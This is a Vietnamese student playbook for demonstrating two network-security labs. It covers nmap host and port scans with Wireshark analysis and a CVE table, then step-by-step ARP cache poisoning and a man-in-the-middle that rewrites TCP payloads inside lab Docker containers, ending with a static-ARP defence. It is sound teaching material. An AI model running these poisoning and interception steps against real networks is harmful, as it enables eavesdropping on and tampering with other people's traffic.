# 06 - Kịch bản demo thực tế Lab01 + Lab02

Tài liệu này là playbook thao tác từng bước để demo trước giảng viên: gõ lệnh nào, màn hình phải hiện gì, chỉ vào đâu khi nói, hỏng thì xử lý ra sao.

- Tổng thời lượng: ~25 phút (Lab01 10 phút, Lab02 15 phút) + 5 phút đệm.
- Nguyên tắc: **mỗi kết luận phải có bằng chứng nhìn thấy được** (màn hình terminal, Wireshark, file pcap).
- Nếu máy chậm: bỏ phần `-sV`, dùng pcap đã chuẩn bị sẵn (mục 5).

---

## 0. Chuẩn bị trước khi vào phòng

### 0.1. Tài nguyên và ràng buộc

| Hạng mục | Giá trị |
|---|---|
| Host | Windows 16 GB, VirtualBox 7.2.20 |
| Host-only network | `192.168.117.1/24` |
| VM Lab01 Attack | `NguyenMachine` - Ubuntu 12.04 i686 - `192.168.117.10` - card `eth14` |
| VM Lab01 Server | `Server3` - Ubuntu 16.04 - `192.168.117.13` - card `enp0s3` |
| VM Lab02 | `Ubuntu2004` - headless, 4096 MB - `192.168.117.5` |
| Tài khoản các VM | `bkcs / bkcs`, sudo: `echo bkcs \| sudo -S <lệnh>` |
| Hostkey Lab01 Attack | `SHA256:K9iqafMZFZYzEXePk+2ZkJs5kh/LH5MiCKPMLwoEJT0` |
| Hostkey Lab01 Server | `SHA256:Q9jbYE3HZKtafjbRdNqDqNhcy9gCZ7IVja6p6hq2e2w` |
| Hostkey Lab02 | `SHA256:rGpwJVNyeNCHnNYdS/OV/pRjKgaBRh6ntpI6nV0pmck` |

Ràng buộc bắt buộc:

- **Chỉ bật một nhóm VM mỗi lượt** (host 16 GB):
  - Demo Lab01: tắt `Ubuntu2004`, bật `NguyenMachine` + `Server3`.
  - Demo Lab02: tắt 2 VM Lab01, bật `Ubuntu2004`.
- **Không chạy Docker Desktop** trên Windows cùng lúc với VirtualBox.
- Snapshot sạch trước demo; hỏng ARP/route thì revert snapshot nhanh hơn sửa.

### 0.2. Lệnh điều khiển VM trên Windows (PowerShell)

```powershell
$vb = "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe"

# Xem VM và trạng thái
& $vb list vms
& $vb list runningvms

# Bật
& $vb startvm "NguyenMachine" --type gui
& $vb startvm "Server3" --type gui
& $vb startvm "Ubuntu2004" --type headless

# Tắt mềm
& $vb controlvm "Ubuntu2004" acpipowerbutton

# Snapshot: liệt kê / khôi phục
& $vb snapshot "Ubuntu2004" list
& $vb snapshot "Ubuntu2004" restore "clean"
```

Kiểm tra dải host-only (phải thấy `192.168.117.1`):

```powershell
& $vb list hostonlyifs
```

### 0.3. SSH / copy file từ Windows sang VM

```powershell
$plink = "C:\Program Files\PuTTY\plink.exe"
$pscp  = "C:\Program Files\PuTTY\pscp.exe"

# SSH Lab01 Attack
& $plink -batch -hostkey "SHA256:K9iqafMZFZYzEXePk+2ZkJs5kh/LH5MiCKPMLwoEJT0" -pw bkcs bkcs@192.168.117.10

# Copy pcap sang VM để mở Wireshark
& $pscp -batch -hostkey "SHA256:K9iqafMZFZYzEXePk+2ZkJs5kh/LH5MiCKPMLwoEJT0" -pw bkcs `
  "F:\3.Laptrinh\2.Learning\Antoanmang\lab01\task1.pcap" bkcs@192.168.117.10:/home/bkcs/
```

### 0.4. Bộ bằng chứng đã có sẵn (mở trước, phòng khi mạng lỗi)

| Bài | File | Nội dung |
|---|---|---|
| Lab01 | `lab01\task1.pcap` (37 KB) | ARP ping scan `-sn -PR` |
| Lab01 | `lab01\task2.pcap` (19 KB) | SYN scan cổng 22/23 |
| Lab01 | `lab01\task3.pcap` (18 KB) | ACK scan 100 cổng |
| Lab01 | `lab01\task4.pcap` (219 KB) | `-sV`: OpenSSH 7.2p2, telnetd, BIND |
| Lab02 | `lab02\evidence\pcaps\task1_full.pcap` | KB1: poison 1 chiều + ping mất gói |
| Lab02 | `lab02\evidence\pcaps\task2_full.pcap` | KB2: poison 2 chiều |
| Lab02 | `lab02\evidence\pcaps\task3_user.pcap` | KB3: User gửi `hello` |
| Lab02 | `lab02\evidence\pcaps\task3_server.pcap` | KB3: Server nhận `pwned` |
| Lab02 | `lab02\evidence\pcaps\task3.pcap` | KB3: Attacker thấy cả hai frame |
| Lab02 | `lab02\report\NhomX_Lab02_BaoCao.docx` | Báo cáo nộp kèm |
| Lab02 | `lab02\evidence\screenshots\` | 21 ảnh `L02-B1..B5` |

Mở sẵn trên Windows: 2 thư mục `lab01\`, `lab02\evidence\`, file docx, và một cửa sổ PowerPoint/Explorer để chiếu ảnh nếu cần.

### 0.5. Checklist 10 phút trước giờ demo

- [ ] `VBoxManage list runningvms` đúng nhóm VM của bài sắp demo.
- [ ] Ping được từ host: `ping 192.168.117.10`, `ping 192.168.117.13` (Lab01) hoặc `ping 192.168.117.5` (Lab02).
- [ ] Lab01: trên Attack `sudo nmap --version` chạy được; Wireshark mở được bằng `sudo wireshark`.
- [ ] Lab02: `docker ps` thấy `user`, `server`, `attacker` đều `Up`.
- [ ] Lab02: `docker exec user ping -c1 10.11.1.20` OK (mạng nội bộ container thông).
- [ ] Terminal đã `cd` đúng thư mục; font terminal >= 12pt cho dễ chiếu; tắt screensaver.
- [ ] Đã `ip neigh flush all` ở cả 3 container (tránh ARP còn poisoned từ lần trước).

### 0.6. Timeline gợi ý

| Thời điểm | Nội dung |
|---|---|
| 0:00 - 0:01 | Giới thiệu mô hình mạng, mục tiêu 2 bài |
| 0:01 - 0:09 | Lab01: 4 kiểu quét nmap + Wireshark + CVE |
| 0:09 - 0:10 | Chốt Lab01: tác động của lộ banner phiên bản |
| 0:10 - 0:12 | Lab02: kiến trúc Docker, thông số 3 container (B1) |
| 0:12 - 0:16 | KB1: ARP poisoning một chiều |
| 0:16 - 0:19 | KB2: poison hai chiều |
| 0:19 - 0:24 | KB3: MITM sửa payload `hello` -> `pwned` |
| 0:24 - 0:26 | B5: ARP tĩnh phòng chống + kết luận |

---

## 1. Demo Lab01 - quét nmap và phân tích gói (~10 phút)

### 1.1. Mô hình và mục tiêu nói

- Attack `192.168.117.10` quét Server `192.168.117.13` trong cùng VLAN/host-only.
- Mục tiêu: (1) phát hiện host, (2) phát hiện cổng mở, (3) thử firewall, (4) nhận diện phiên bản dịch vụ, (5) đọc gói tin trên Wireshark để thấy *dấu vết* từng kiểu quét.
- Thông điệp: nmap không "ảo thuật" - mỗi kỹ thuật là một kiểu gói tin khác nhau, và người phòng thủ phát hiện được nhờ đúng dấu vết đó.

### 1.2. Bước 1 - xác nhận mạng trên máy Attack

```bash
ip -br a | grep eth14
ip route
```

Kỳ vọng:

```text
eth14            UP             192.168.117.10/24
default via 192.168.117.1 dev eth14
```

Nói: card mạng lab là `eth14` (không phải `eth0`), nên mọi lệnh nmap/Wireshark phải chỉ đúng interface nếu cần `-e`.

### 1.3. Bước 2 - quét ARP `-sn -PR` (host discovery không ICMP)

```bash
sudo nmap -sn -PR 192.168.117.0/24
```

Kỳ vọng (nội dung tương tự):

```text
Starting Nmap 5.21 ( http://nmap.org ) at ...
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. ...
Nmap scan report for 192.168.117.1
Host is up (0.00050s latency).
MAC Address: 0A:00:27:00:00:01 (...)
Nmap scan report for 192.168.117.10
Host is up.
Nmap scan report for 192.168.117.13
Host is up (0.00042s latency).
MAC Address: 08:00:27:8D:2D:86 (Cadmus Computer Systems)
...
Nmap done: 256 IP addresses (4 hosts up) scanned in ... seconds
```

Nói khi chỉ màn hình:

- nmap gửi **ARP Request** broadcast cho từng IP; host nào trả **ARP Reply** là đang sống.
- ARP không thể bị firewall IP chặn (nó chạy dưới lớp IP), nên trong LAN đây là cách phát hiện host tin cậy nhất.
- Cảnh báo `mass_dns` **vô hại** - chỉ là không reverse DNS được; thêm `--system-dns` nếu muốn hết cảnh báo.
- MAC `08:00:27:...` là dải VirtualBox (OUI `08:00:27`) - gợi ý mục tiêu là VM.

### 1.4. Bước 3 - SYN scan `-sS` (half-open)

```bash
sudo nmap -sS -p22,23 192.168.117.13
```

Kỳ vọng:

```text
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
MAC Address: 08:00:27:8D:2D:86 (Cadmus Computer Systems)
```

Nói:

- `-sS` gửi SYN, nhận SYN-ACK thì kết luận **open**, rồi gửi RST để **không hoàn tất** handshake -> không tạo phiên, khó bị ghi log ứng dụng.
- Cần quyền root vì phải tự dựng gói TCP thô.
- Server mở cả SSH (quản trị) và telnet (không mã hóa) - đây là điểm yếu cần nêu.

### 1.5. Bước 4 - ACK scan `-sA` (thử firewall)

```bash
sudo nmap -sA -p1-100 192.168.117.13
```

Kỳ vọng:

```text
All 100 scanned ports on 192.168.117.13 are unfiltered
MAC Address: 08:00:27:8D:2D:86 (Cadmus Computer Systems)
```

Nói:

- ACK scan **không** kết luận cổng mở/đóng, chỉ phân biệt **unfiltered** (có RST trả về) và **filtered** (không có phản hồi/ICMP admin prohibited).
- Kết quả `unfiltered` = không có firewall stateful nào chặn giữa hai máy; phòng thủ gần như phụ thuộc cấu hình dịch vụ.
- Nhấn mạnh: đừng nhầm `unfiltered` với `open`.

### 1.6. Bước 5 - nhận diện phiên bản `-sV`

```bash
sudo nmap -sV -p22,23,53 192.168.117.13
```

Kỳ vọng (đuôi phiên bản có thể khác chút theo bản cập nhật):

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu-4ubuntu2.x (Ubuntu Linux; protocol 2.0)
23/tcp open  telnet  Linux telnetd
53/tcp open  domain  ISC BIND 9.10.3-P4-Ubuntu
```

Nói:

- `-sV` mở kết nối thật, đọc banner/probe để đoán phần mềm + phiên bản.
- Đây là bước **nguy hiểm nhất** cho mục tiêu: lộ chính xác phiên bản -> tra CVE là ra lỗ hổng.
- Nếu chậm: bỏ `-sV`, chiếu `task4.pcap` đã có.

Kiểm chứng nhanh banner SSH bằng tay (nếu giảng viên muốn xem "banner grab" thủ công):

```bash
nc 192.168.117.13 22
# SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.x
# Ctrl+C để thoát
```

### 1.7. Bước 6 - Wireshark: chỉ dấu vết từng kiểu quét

Chạy Wireshark với quyền root (bắt trên `eth14` cần root):

```bash
sudo wireshark
```

Nếu báo `No interface can be used for capturing`: đúng lỗi chạy user thường, phải `sudo`.
Chọn interface `eth14`, bấm Start. Nếu chỉ để chiếu pcap có sẵn:

```bash
wireshark /home/bkcs/task1.pcap &
```

#### 1.7.1. `task1.pcap` - ARP ping scan

- Display filter: `arp`
- Chỉ: cột Info toàn `who has 192.168.117.x? Tell 192.168.117.10` và `192.168.117.x is at ...`.
- Kỹ thuật nói: "broadcast hỏi từng IP, ai trả lời là sống; không cần ICMP nên qua được firewall chặn ping".

#### 1.7.2. `task2.pcap` - SYN scan

- Display filter: `tcp.flags.syn == 1 && tcp.flags.ack == 0`
- Chỉ từng dòng: `src 10 -> 13:22 [SYN] Seq=0`, tiếp theo `13 -> 10 [SYN, ACK]`, rồi `10 -> 13 [RST]`.
- Bật cột `tcp.flags` (chuột phải cột -> Column Preferences) để thấy `0x0002`, `0x0012`, `0x0004`.
- Kỹ thuật nói: "SYN -> SYN-ACK = cổng mở; không có ACK cuối nên phiên không được thiết lập".

#### 1.7.3. `task3.pcap` - ACK scan

- Display filter: `tcp.flags.ack == 1 && tcp.flags.syn == 0`
- Chỉ: `10 -> 13 [ACK]` trần (không SYN) rồi `13 -> 10 [RST, ACK]`.
- Kỹ thuật nói: "RST trả về = gói qua được thiết bị lọc -> unfiltered. Nếu bị drop im lặng thì không có phản hồi -> filtered".

#### 1.7.4. `task4.pcap` - version detection

- Display filter: `tcp.port == 22`
- Chuột phải gói đầu tiên -> **Follow TCP Stream**.
- Chỉ banner: `SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.x`.
- Kỹ thuật nói: "chỉ một chuỗi banner đã đủ xác định phần mềm + phiên bản, không cần exploit gì".

Lưu pcap minh họa nếu muốn nộp thêm: **File -> Save As** -> `demo_lab01.pcap`. Dừng capture bằng `Ctrl+E` trước khi lưu.

### 1.8. Bước 7 - bảng CVE gắn với phiên bản phát hiện được

| Dịch vụ | Phiên bản | CVE | Mô tả ngắn | Hướng khắc phục |
|---|---|---|---|---|
| OpenSSH | 7.2p2 | CVE-2016-6210 | Dò username qua timing khi gửi password dài | Nâng OpenSSH, giới hạn nguồn SSH |
| OpenSSH | 7.2p2 | CVE-2016-6515 | DoS làm cạn CPU qua `crypt()`/MaxAuthTries | Nâng phiên bản, rate-limit |
| OpenSSH | 7.2p2 | CVE-2018-15473 | Liệt kê username qua gói auth dị dạng | Nâng >= 7.8 |
| BIND | 9.10.3-P4 | CVE-2016-2776 | Assertion failure trong `buffer.c` -> crash DoS | Nâng bản vá BIND |
| BIND | 9.10.3-P4 | CVE-2017-3136/3137 | Chuỗi CNAME dị dạng gây assertion -> DoS | Nâng bản vá BIND |
| telnetd | netkit 0.17 | CVE-2020-10188 | Tràn buffer -> RCE từ xa | Tắt telnet, chuyển SSH |

Nói thêm: telnet truyền username/password **dạng rõ**; bắt được bằng Wireshark là đọc được. Đây là lý do telnet phải bị loại bỏ khỏi mọi hệ thống thật.

### 1.9. Sự cố Lab01 và cách xử lý

| Hiện tượng | Nguyên nhân | Xử lý |
|---|---|---|
| `Invalid character in host specification` / `Failed to resolve` | Dán lệnh từ chat/web dính ký tự ẩn (non-breaking space, zero-width) | **Gõ lại tay** đúng `192.168.117.13`; hoặc `cat -A` để thấy ký tự lạ |
| `mass_dns: warning` | Không có DNS server | Vô hại; thêm `--system-dns` nếu muốn sạch output |
| `No interface can be used for capturing` | Chạy Wireshark bằng user thường | `sudo wireshark`, chọn `eth14` |
| Wireshark không thấy gói | Bắt sai card (mặc định `eth0`) | Chọn đúng `eth14`; kiểm tra `ip -br a` |
| nmap chạy rất lâu | `-sV` + mạng chậm | Bỏ `-sV`, dùng pcap có sẵn; thêm `-T4` |
| Không SSH được vào VM | Sai hostkey / VM chưa lên mạng | Kiểm tra IP bằng console VM; dùng đúng hostkey |

---

## 2. Demo Lab02 - ARP Cache Poisoning + MITM (~15 phút)

### 2.1. Kiến trúc và thông số cố định

Mạng Docker bridge `10.11.1.0/24` (x=11, y=1 là giả định của nhóm; đề gốc ghi `192.168.100.0/24`).

| Vai trò | Container | IP | MAC |
|---|---|---|---|
| Gateway | bridge (host) | `10.11.1.1` | - |
| User (nạn nhân) | `user` | `10.11.1.10` | `02:42:0a:0b:01:0a` |
| Server (mục tiêu) | `server` | `10.11.1.20` | `02:42:0a:0b:01:14` |
| Attacker | `attacker` | `10.11.1.51` | `02:42:0a:0b:01:33` |

Quy luật MAC: `02:42:` + hex của IP -> `.10` = `0a`, `.11` = `0b`, `.1` = `01`, rồi `.10` = `0a`... Vì IP cố định trong compose nên MAC **ổn định** qua các lần tạo lại container.

Nói phần kiến trúc:

- Mỗi container có network namespace riêng: `arp -n`, `ip neigh`, `ip_forward` là **của riêng container**, không phải của host.
- Cả 3 nằm cùng một bridge L2 -> ARP của container này được container khác nghe thấy. Đây chính là điều kiện để poison.
- `attacker` chạy `privileged: true` để được ghi `/proc/sys/net/ipv4/ip_forward` và mở raw socket AF_PACKET.

### 2.2. Khởi động môi trường

```bash
cd ~/it4263lab/lab02
docker-compose up -d
docker ps --format '{{.Names}}\t{{.Status}}'
```

Kỳ vọng:

```text
user       Up ...
server     Up ...
attacker   Up ...
```

Nếu container thiếu `tmux`/`tcpdump`/`nc` (image cũ):

```bash
docker-compose build
docker-compose up -d
```

**Không dùng `docker restart`** - trên VM 4 GB dễ treo. Cần reset thì `ip neigh flush all` + `pkill` tiến trình, cùng lắm `docker-compose down && docker-compose up -d`.

### 2.3. B1 - thông số 3 container

```bash
for c in user server attacker; do
  echo "[$c]"
  docker exec $c ip -br a | grep eth0
  docker exec $c cat /sys/class/net/eth0/address
  docker exec $c arp -n
done
```

Kỳ vọng:

```text
[user]
eth0@if6         UP             10.11.1.10/24
02:42:0a:0b:01:0a
[server]
eth0@if8         UP             10.11.1.20/24
02:42:0a:0b:01:14
[attacker]
eth0@if10        UP             10.11.1.51/24
02:42:0a:0b:01:33
```

Chỉ vào màn hình:

- Bảng ARP **ban đầu trống** (chưa có `10.11.1.20`), vì chưa ai giao tiếp.
- MAC tuân quy luật `02:42:<hex IP>` -> dễ đối chiếu, dễ phát hiện giả mạo nếu MAC lạ.
- `ip_forward` mặc định = 0: kiểm chứng `docker exec attacker sysctl net.ipv4.ip_forward`.

### 2.4. KB1 - poison một chiều tới User (~4 phút)

Ý tưởng: nói dối **User** rằng IP Server `10.11.1.20` nằm tại MAC của Attacker. Sau đó gói User -> Server đi vào Attacker; vì `ip_forward=0`, Attacker **bỏ gói** -> mất kết nối.

Chuẩn bị cache ARP "sạch" cho cả 3 (bắt buộc, tránh tàn dư lần trước):

```bash
for c in user server attacker; do docker exec $c ip neigh flush all; done
docker exec user ping -c 1 10.11.1.20 >/dev/null
docker exec server ping -c 1 10.11.1.10 >/dev/null
docker exec user arp -n            # phải thấy 10.11.1.20 -> 02:42:0a:0b:01:14
```

Bật bắt gói trên User (dùng `-U` để ghi ngay xuống đĩa):

```bash
docker exec user pkill -x tcpdump 2>/dev/null
docker exec -d user sh -c "tcpdump -U -i eth0 -n 'arp or icmp' -w /tmp/kb1.pcap"
sleep 2
```

Chạy poison 8 gói, mỗi giây 1 gói:

```bash
docker exec -d attacker sh -c "python3 -u /attack/scenario1.py --count 8 --interval 1 > /tmp/kb1.log 2>&1"
sleep 9
docker exec attacker pkill -f scenario1
```

Kiểm chứng:

```bash
docker exec user arp -n
docker exec user ping -c 3 10.11.1.20
docker exec attacker cat /tmp/kb1.log
```

Kỳ vọng:

```text
? (10.11.1.20) at 02:42:0a:0b:01:33 [ether] on eth0
3 packets transmitted, 0 received, 100% packet loss
[+] Poison #... 10.11.1.20 -> ... (MAC attacker)
```

Kết thúc capture và copy pcap ra ngoài:

```bash
docker exec user pkill -INT tcpdump; sleep 2
docker cp user:/tmp/kb1.pcap ~/cap/demo_kb1.pcap
```

Nói khi chỉ màn hình:

- ARP Reply là **unsolicited** (không ai hỏi vẫn trả lời) và **không có xác thực** -> User tin ngay, ghi đè cache.
- `ping` mất 100% vì frame đi tới MAC Attacker; `ip_forward=0` nên kernel không chuyển tiếp, gói bị hủy. Đây là **DoS**, chưa phải MITM.
- Muốn chứng minh "mạng vẫn sống, chỉ ARP bị lừa": `docker exec user ping -c 2 10.11.1.51` (tới Attacker) vẫn thông; và sau khi `ip neigh flush all` + ping lại Server thì thông.

Phân tích `demo_kb1.pcap` trong Wireshark:

```bash
wireshark -o gui.zoom_level:1.0 -Y 'arp.opcode == 2' ~/cap/demo_kb1.pcap
```

- Filter `arp.opcode == 2` (chỉ Reply).
- Chọn gói poison đầu tiên (trong bộ bằng chứng đã nộp là **No. 7**; pcap mới có thể lệch vài gói do ARP khởi tạo).
- Mở rộng **Ethernet II** + **Address Resolution Protocol**:
  - MAC nguồn (`eth.src`) = `02:42:0a:0b:01:33` (Attacker).
  - `Sender IP address` = `10.11.1.20` (Server - bị giả mạo).
  - `Target IP address` = `10.11.1.10` (User).
- Wireshark có thể hiện expert warning **Duplicate IP address detected** - chỉ ra ngay: cùng một IP xuất hiện với 2 MAC khác nhau.
- Filter `icmp` để chỉ ra không có Echo Reply nào -> khớp với 100% loss.

### 2.5. KB2 - poison hai chiều (~3 phút)

Ý tưởng: poison thêm **Server** để Server tưởng IP User nằm tại MAC Attacker. Lúc này cả 2 chiều đều đi qua Attacker -> đủ điều kiện MITM.

```bash
for c in user server attacker; do docker exec $c ip neigh flush all; done
docker exec user ping -c 1 10.11.1.20 >/dev/null
docker exec server ping -c 1 10.11.1.10 >/dev/null

docker exec attacker pkill -x tcpdump 2>/dev/null
docker exec -d attacker sh -c "tcpdump -U -i eth0 -n 'arp' -w /tmp/kb2.pcap"
sleep 2
docker exec -d attacker sh -c "python3 -u /attack/scenario2.py --count 8 --interval 1 > /tmp/kb2.log 2>&1"
sleep 9
docker exec attacker pkill -f scenario2

docker exec user arp -n
docker exec server arp -n
docker exec attacker pkill -INT tcpdump; sleep 2
docker cp attacker:/tmp/kb2.pcap ~/cap/demo_kb2.pcap
```

Kỳ vọng:

```text
# trên user
? (10.11.1.20) at 02:42:0a:0b:01:33 [ether] on eth0
# trên server
? (10.11.1.10) at 02:42:0a:0b:01:33 [ether] on eth0
```

Nói:

- Mỗi vòng lặp gửi **2 Reply**: một cho User (giả IP Server), một cho Server (giả IP User). Trong pcap thấy cặp đôi đều đặn mỗi giây -> dấu hiệu rất dễ phát hiện nếu có IDS/arpwatch.
- Cả hai bảng ARP đều trỏ về MAC Attacker: đây là **điều kiện cần** của MITM.
- Minh họa thêm (tuỳ thời gian): bật forwarding tạm thời để thấy "mạng vẫn thông nhưng đi vòng":
  ```bash
  docker exec attacker sysctl -w net.ipv4.ip_forward=1
  docker exec user ping -c 3 10.11.1.20      # thành công trở lại
  docker exec -d attacker sh -c "tcpdump -U -i eth0 -n -c 6 icmp -w /tmp/kb2_icmp.pcap"
  docker exec user ping -c 2 10.11.1.20 >/dev/null
  docker exec attacker pkill -INT tcpdump; sleep 2
  docker cp attacker:/tmp/kb2_icmp.pcap ~/cap/demo_kb2_icmp.pcap
  ```
  Chỉ vào pcap: Attacker thấy ICMP của User **và** reply của Server -> "gói đi qua tôi". Sau đó trả lại `ip_forward=0` trước KB3.

Phân tích `demo_kb2.pcap`:

```bash
wireshark -Y 'arp.opcode == 2' ~/cap/demo_kb2.pcap
```

- Trong bộ bằng chứng đã nộp: gói poison đầu tiên **No. 5 -> User**, **No. 6 -> Server**.
- Mở rộng từng gói, đối chiếu `eth.src` luôn là MAC Attacker, còn `Sender IP` lần lượt là Server/User.
- Hai gói liên tiếp nhau mỗi giây -> nhịp poison.

### 2.6. KB3 - MITM sửa nội dung (~5 phút)

Ý tưởng: User gõ `hello server from user`; Attacker chặn frame, thay `hello` bằng `pwned` (cùng độ dài), **tính lại checksum IP/TCP**, gửi tiếp tới Server. Server nhận `pwned server from user`.

Điều kiện: đã poison 2 chiều (KB2), `ip_forward=0`, không còn listener cũ ở cổng 10101.

Dọn cổng 10101 và tiến trình cũ:

```bash
for c in user server attacker; do docker exec $c pkill -x nc 2>/dev/null; done
docker exec server ss -ltn | grep 10101 || echo "port 10101 free"
```

Bật poison liên tục + MITM:

```bash
docker exec attacker sysctl -w net.ipv4.ip_forward=0
docker exec -d attacker sh -c "python3 -u /attack/scenario2.py --count 0 --interval 1 > /tmp/kb3_poison.log 2>&1"
sleep 3
docker exec -d attacker sh -c "python3 -u /attack/mitm.py > /tmp/kb3_mitm.log 2>&1"
sleep 3
docker exec user arp -n       # 10.11.1.20 -> MAC attacker
```

#### Cách A - demo tương tác 2 terminal (nhìn trực tiếp)

Mở 2 terminal (hoặc 2 tab tmux):

- Terminal A (Server):
  ```bash
  docker exec -it server bash
  nc -l 10101
  ```
- Terminal B (User):
  ```bash
  docker exec -it user bash
  nc 10.11.1.20 10101
  hello server from user
  ```

Kỳ vọng: Terminal A hiện `pwned server from user` (chữ `hello` đã bị thay). Terminal C trên VM xem log:

```bash
docker exec attacker tail -5 /tmp/kb3_mitm.log
# [+] #1 10.11.1.10:xxxxx -> 10.11.1.20:10101 'hello' -> 'pwned'
```

#### Cách B - demo không tương tác (ổn định, có pcap)

Bật tcpdump ở cả 3 container để có bằng chứng 3 góc nhìn:

```bash
for c in user server attacker; do docker exec $c pkill -x tcpdump 2>/dev/null; done
docker exec -d user     sh -c "tcpdump -U -i eth0 -n 'arp or tcp port 10101' -w /tmp/kb3_user.pcap"
docker exec -d server   sh -c "tcpdump -U -i eth0 -n 'arp or tcp port 10101' -w /tmp/kb3_server.pcap"
docker exec -d attacker sh -c "tcpdump -U -i eth0 -n 'arp or tcp port 10101' -w /tmp/kb3.pcap"
sleep 3
```

Gửi và nhận:

```bash
docker exec server rm -f /tmp/recv.txt
docker exec -d server sh -c "timeout 25 nc -l 10101 > /tmp/recv.txt 2>&1"
sleep 2
docker exec user sh -c "echo hello server from user | timeout 6 nc 10.11.1.20 10101"
docker exec server cat /tmp/recv.txt        # pwned server from user
docker exec attacker tail -2 /tmp/kb3_mitm.log
```

Dừng capture đúng cách rồi copy:

```bash
docker exec user pkill -INT tcpdump
docker exec server pkill -INT tcpdump
docker exec attacker pkill -INT tcpdump
sleep 3
docker cp user:/tmp/kb3_user.pcap ~/cap/demo_kb3_user.pcap
docker cp server:/tmp/kb3_server.pcap ~/cap/demo_kb3_server.pcap
docker cp attacker:/tmp/kb3.pcap ~/cap/demo_kb3.pcap
```

Kiểm chứng bằng tshark (không cần mở GUI):

```bash
echo "[user gui]"
tshark -r ~/cap/demo_kb3_user.pcap -Y 'tcp.port==10101 and tcp.len>0' -T fields -e ip.src -e tcp.payload | tail -2
echo "[server nhan]"
tshark -r ~/cap/demo_kb3_server.pcap -Y 'tcp.port==10101 and tcp.len>0' -T fields -e ip.src -e tcp.payload | tail -2
echo "[attacker thay ca hai]"
tshark -r ~/cap/demo_kb3.pcap -Y 'tcp.port==10101 and tcp.len>0' -T fields -e eth.src -e eth.dst -e tcp.payload | tail -2
```

Kỳ vọng: payload hex của `hello` (`68656c6c6f`) ở phía User; payload `pwned` (`70776e6564`) ở phía Server và trong frame Attacker gửi đi.

Phân tích `demo_kb3.pcap` trên Wireshark:

```bash
wireshark -Y 'tcp.port == 10101' ~/cap/demo_kb3.pcap
```

- Trong bộ bằng chứng đã nộp: frame **21** = User gửi `hello` (đích MAC = Attacker), frame **22** = Attacker gửi `pwned` tới Server (nguồn MAC = Attacker).
- Chuột phải frame 21 -> **Follow TCP Stream**: thấy `hello server from user`.
- Làm tương tự frame 22: thấy `pwned server from user`.
- Bật cột `eth.src` / `eth.dst` để thấy MAC bị đổi; bật `tcp.checksum`/`ip.checksum` để nói về việc tính lại checksum (Wireshark có thể báo checksum sai nếu bắt trên veth do offload - xem mục 4).

Nói phần kỹ thuật (ngắn, đúng trọng tâm):

- `mitm.py` mở raw socket `AF_PACKET`, đọc frame TCP cổng 10101, đổi `eth.src`/`eth.dst` sang MAC thật của hai bên rồi gửi lại ra interface.
- Thay payload `hello` -> `pwned` **cùng độ dài** để không phải sửa `Seq`/`Ack`.
- **Bắt buộc tính lại checksum IP + TCP** cho mọi frame forward (kể cả frame không sửa payload): frame đọc từ veth có thể mang checksum chưa hoàn thiện (checksum offload). Nếu gửi nguyên trạng, Server loại gói, không có SYN-ACK, `Tcp InCsumErrors` tăng.
- `net.ipv4.ip_forward=0` để kernel không tự forward; việc chuyển tiếp do script đảm nhiệm -> Attacker kiểm soát hoàn toàn nội dung.
- Đây là lý do ARP poisoning nguy hiểm: không cần exploit phần mềm, chỉ cần cùng LAN.

### 2.7. B5 - phòng chống bằng ARP tĩnh (~2 phút)

```bash
docker exec user ip neigh flush all
docker exec user arp -s 10.11.1.20 02:42:0a:0b:01:14
docker exec user arp -n                 # entry cờ M (permanent)
docker exec -d attacker sh -c "python3 -u /attack/scenario1.py --count 8 --interval 1"
sleep 9
docker exec attacker pkill -f scenario1
docker exec user arp -n                 # vẫn 02:42:0a:0b:01:14, cờ M
docker exec user ping -c 3 10.11.1.20
docker exec user arp -d 10.11.1.20      # dọn dẹp sau demo
```

Kỳ vọng:

```text
10.11.1.20 at 02:42:0a:0b:01:14 [ether] PERM on eth0
3 packets transmitted, 3 received, 0% packet loss
```

Nói:

- Entry `PERM` **không bị ARP Reply ghi đè** -> poison thất bại, ping 0% loss.
- Nhưng đây chỉ là biện pháp thủ công, phải khai báo từng cặp IP-MAC, không mở rộng được, không chống DHCP spoofing/DNS spoofing, và mất khi container/VM khởi động lại.
- Giải pháp thực tế: **DHCP Snooping + Dynamic ARP Inspection** trên switch, port security, 802.1X, arpwatch/IDS, phân đoạn VLAN, và mã hóa đầu cuối (TLS/SSH) để dù bị MITM cũng không đọc được nội dung.

### 2.8. Dọn dẹp sau demo Lab02

```bash
for c in user server attacker; do
  docker exec $c pkill -x nc 2>/dev/null
  docker exec $c pkill -x tcpdump 2>/dev/null
  docker exec $c ip neigh flush all
done
docker exec attacker pkill -f mitm.py 2>/dev/null
docker exec attacker pkill -f scenario2 2>/dev/null
docker exec attacker pkill -f scenario1 2>/dev/null
docker exec attacker sysctl -w net.ipv4.ip_forward=0
docker exec user arp -d 10.11.1.20 2>/dev/null
```

Nếu cần trạng thái sạch hoàn toàn: `docker-compose down && docker-compose up -d` (chậm hơn nhưng an toàn hơn `docker restart`).

---

## 3. Câu hỏi giảng viên hay hỏi

| Câu hỏi | Trả lời ngắn |
|---|---|
| Vì sao KB1 ping mất gói? | User gửi tới MAC Attacker; Attacker để `ip_forward=0` nên kernel bỏ gói, Server không nhận được. |
| Vì sao KB2 cần poison cả hai chiều? | Chỉ poison User thì gói đi qua Attacker nhưng gói về vẫn đi trực tiếp; muốn thấy toàn bộ phiên và sửa nội dung phải poison cả Server. |
| `ip_forward` là gì? | Sysctl theo từng network namespace (`/proc/sys/net/ipv4/ip_forward`); container mặc định 0. Không kế thừa từ Docker host. |
| ICMP Redirect có phải cơ chế chuyển tiếp? | Không. Gói tới đích nhờ IP forwarding (hoặc script tự forward). Redirect chỉ là thông báo định tuyến. |
| Vì sao phải tính lại checksum? | Frame đọc từ veth có thể mang checksum chưa hoàn thiện (checksum offload); gửi nguyên trạng thì bên nhận loại gói. |
| Vì sao pcap nhỏ? | Chỉ bắt ARP + TCP cổng 10101, không bắt toàn bộ lưu lượng. |
| ARP tĩnh có đủ an toàn? | Không. Chỉ bảo vệ cặp đã khai báo, không mở rộng, không chống DHCP/DNS spoofing. |
